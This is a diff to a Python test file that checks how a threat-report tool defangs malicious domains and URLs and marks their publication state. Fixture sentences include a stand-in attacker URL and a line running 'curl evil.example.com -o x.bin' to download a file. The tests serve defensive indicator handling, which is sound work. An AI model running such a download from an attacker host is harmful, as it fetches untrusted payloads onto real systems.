@@ -142,6 +142,24 @@ STATE = f"({UNPUBLISHED_STATE})"
             "It resolves EVIL.example.com at start.",
             f"It resolves EVIL[.]example[.]com {STATE} at start.",
         ),
+        # A host standing only in a URL or a path: the state after the whole of it.
+        (
+            "It fetches https://evil.example.com/gate.php over HTTPS.",
+            f"It fetches hxxps://evil[.]example[.]com/gate.php {STATE} over HTTPS.",
+        ),
+        (
+            "After the wait it reaches evil.example.com/gate.",
+            f"After the wait it reaches evil[.]example[.]com/gate {STATE}.",
+        ),
+        # Inside a code span or a quotation with spaces: the state after its close.
+        (
+            "It runs `curl evil.example.com -o x.bin` at start.",
+            f"It runs `curl evil[.]example[.]com -o x.bin` {STATE} at start.",
+        ),
+        (
+            'The string "connect to evil.example.com now" is decoded.',
+            f'The string "connect to evil[.]example[.]com now" {STATE} is decoded.',
+        ),
     ],
 )
 def test_the_state_is_written_after_the_whole_token(sentence: str, printed: str) -> None:
@@ -149,12 +167,11 @@ def test_the_state_is_written_after_the_whole_token(sentence: str, printed: str)
     assert line == f"It beacons. {printed}"
 
 
-def test_a_value_standing_nowhere_as_a_whole_token_leaves_its_sentence_out() -> None:
+def test_a_value_standing_nowhere_leaves_its_sentence_out() -> None:
+    # Inside a longer address, or not in the sentence at all.
     assert _with_unpublished_state("It contacts 18.8.8.81.", ["8.8.8.8"]) is None
-    assert (
-        _with_unpublished_state("It fetches https://evil.example.com/a.", ["evil.example.com"])
-        is None
-    )
+    assert _with_unpublished_state("It contacts notevil.example.com.", ["evil.example.com"]) is None
+    assert _with_unpublished_state("It contacts 192.0.2.7.", ["evil.example.com"]) is None
 
 
 def test_a_numeric_confidence_is_worded_and_another_flag_leaves_its_sentence_out() -> None:
